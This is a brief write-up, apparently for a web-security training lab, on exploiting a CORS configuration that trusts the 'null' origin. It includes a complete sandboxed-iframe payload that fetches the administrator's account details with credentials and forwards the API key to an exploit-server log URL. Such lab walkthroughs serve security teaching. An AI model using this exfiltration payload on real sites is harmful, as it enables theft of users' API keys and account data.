# CORS vulnerability with trusted null origin
* This website has an insecure CORS configuration in that it trusts the "null" origin.
	* To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
	* You can log in yo your own account using the following credentials `wiener:peter`

### 1. Enumerate the Website
* Log in as Wiener and enumerte the request and response.
	* From /accountDetails, the API key can be found

* Also the response contains Access-Control-Allow-Credentials, which mean that the site may support CORS.

### 2. At the exploit server, Make a malicious HTML file to obtain Adminitstrator's API key
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://ac9e1fec1fe18832c0b3a08000120066.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-acb61f311fb28823c03fa0ce01f000f1.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
